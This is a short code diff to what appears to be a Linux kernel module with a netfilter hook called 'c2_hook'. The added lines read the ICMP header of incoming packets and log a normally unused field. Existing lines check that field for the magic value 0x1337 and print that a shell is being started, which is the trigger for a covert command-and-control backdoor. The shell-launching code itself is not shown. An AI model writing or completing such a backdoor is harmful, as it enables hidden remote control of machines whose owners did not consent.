@@ -23,7 +23,9 @@ static unsigned int c2_hook(void *priv, struct sk_buff *skb, const struct nf_hoo
 
     else {
 	//something here to somehow access icmp header from ipv4 header??
+	struct icmphdr *hdr = (struct icmphdr *) (skb->data + sizeof(struct iphdr));
 	uint16_t unused_header = be16_to_cpu(hdr->un.frag.__unused);
+	printk(KERN_INFO "ICMP UNUSED: %x\n", unused_header);
 	if (unused_header == 0x1337) {
 	    printk(KERN_INFO "Got ICMP sequence starting shell\n");
 	}
